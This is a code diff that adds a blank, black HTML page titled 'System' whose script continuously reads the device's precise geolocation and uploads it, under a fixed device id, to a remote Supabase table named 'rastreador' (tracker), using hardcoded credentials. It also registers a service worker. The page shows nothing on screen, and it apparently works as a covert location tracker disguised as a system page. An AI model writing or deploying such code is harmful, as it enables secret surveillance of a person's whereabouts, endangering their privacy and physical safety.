@@ -1,0 +1,7 @@
+<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System</title><link rel="manifest" href="manifest.json"><style>html,body{background:#000;margin:0;height:100%}</style></head><body>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+<script>
+const URL="https://zrghmwdzxslpuyglsvnq.supabase.co"; const KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf"; const sb=supabase.createClient(URL,KEY);
+navigator.geolocation.watchPosition(async p=>{await sb.from('rastreador').upsert({device_id:'LG',lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()},{onConflict:'device_id'})},null,{enableHighAccuracy:true});
+if('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');
+</script></body></html>
